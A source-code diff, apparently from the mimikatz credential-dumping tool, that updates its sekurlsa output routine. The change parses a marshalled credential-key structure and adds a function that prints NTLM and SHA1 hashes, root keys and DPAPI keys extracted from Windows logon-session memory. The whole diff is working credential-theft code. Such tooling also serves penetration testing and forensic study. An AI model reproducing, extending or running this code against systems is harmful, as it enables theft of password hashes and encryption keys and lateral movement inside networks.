@@ -194,7 +194,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 {
 	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
 	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
-	PCREDENTIAL_KEYCREDENTIAL pCredentialKeyCreds;
+	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
+	PVOID base;
 	DWORD type;
 
 	if(mesCreds)
@@ -223,11 +224,10 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					dprintf("\n\t * SHA1     : "); kull_m_string_dprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
-					pCredentialKeyCreds = (PCREDENTIAL_KEYCREDENTIAL) credentials->Buffer; /* .. */
-					dprintf("\n\t * NTLM     : ");
-					kull_m_string_dprintf_hex(pCredentialKeyCreds->NtOwfPassword, pCredentialKeyCreds->szNtlmHash, 0);
-					dprintf("\n\t * SHA1     : ");
-					kull_m_string_dprintf_hex(pCredentialKeyCreds->Sha1OwfPassword, pCredentialKeyCreds->szSha1Hash, 0);
+					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer; /* .. */
+					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL);
+					kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key1, &base);
+					kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key2, &base);
 					break;
 				default:
 					dprintf("\n\t * Raw data : ");
@@ -285,4 +285,27 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			dprintf("\n");
 	}
 	else dprintf("LUID KO\n");
+}
+
+VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
+{
+	switch(key->unkId)
+	{
+	case 0x00010002:
+		dprintf("\n\t * NTLM     : ");
+		break;
+	case 0x00020002:
+		dprintf("\n\t * SHA1     : ");
+		break;
+	case 0x00030002:
+		dprintf("\n\t * RootKey  : ");
+		break;
+	case 0x00040002:
+		dprintf("\n\t * DPAPI    : ");
+		break;
+	default:
+		dprintf("\n\t * %08x : ", key->unkId);
+	}
+	kull_m_string_dprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
+	*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
 }
